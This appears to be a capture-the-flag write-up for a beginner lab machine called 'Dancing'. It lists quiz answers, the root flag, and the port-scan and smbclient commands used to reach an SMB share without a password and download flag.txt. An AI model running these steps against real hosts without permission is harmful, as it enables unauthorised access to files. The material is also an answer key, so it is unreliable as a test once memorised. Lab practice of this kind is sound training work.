# Dancing

## Questionnaire

##### What does the 3-letter acronym SMB stand for?

```
Server Message Block
```

##### What port does SMB use to operate at?

```
445
```

##### What is the service name for port 445 that came up in our Nmap scan?

```
microsoft-ds
```

##### What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share?

```
-L
```

##### How many shares are there on Dancing?

```
4
```

##### What is the name of the share we are able to access in the end with a blank password?

```
WorkShares
```

##### What is the command we can use within the SMB shell to download the files we find?

```
get
```

##### Submit root flag

```
5f61c10dffbc77a704d76016a22f1664
```

## Commands

### Scan

```
$ rustscan -a 10.129.1.203

PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
5985/tcp  open  wsman        syn-ack
47001/tcp open  winrm        syn-ack
```

### Shares

```
$ smbclient --no-pass -L 10.129.1.203

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk
```

### File

```
$ smbclient --no-pass //10.129.1.203/Workshares

smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

		5114111 blocks of size 4096. 1732425 blocks available
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

		5114111 blocks of size 4096. 1732424 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \James.P\> quit
```
